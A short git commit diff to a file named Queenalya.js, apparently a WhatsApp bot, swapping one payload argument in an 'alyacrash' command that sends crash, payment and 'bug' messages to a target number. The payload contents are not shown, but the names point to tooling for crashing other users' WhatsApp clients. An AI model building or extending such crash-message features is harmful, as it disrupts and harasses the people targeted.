0c2191bf5ae6c70352c47dc1c3d9da1cf62926e5
PhantomkidIII <ashkings0100@gmail.com>
2024-10-11 13:25:20 +0100

    Add files via upload

--- Queenalya.js
+++ Queenalya.js
@@ -21299,7 +21299,7 @@ case "alyacrash": {
         await sendSystemCrashMessage(whatsappNumber, force);
         await sendPaymentInfoMessage(whatsappNumber, painbug);
         await ngeloc(whatsappNumber, force2);
-        await abug2(whatsappNumber, alyaCrashyIos);
+        await abug2(whatsappNumber, painbug);
 
          if (j === 1) {
             // Additional logic if needed
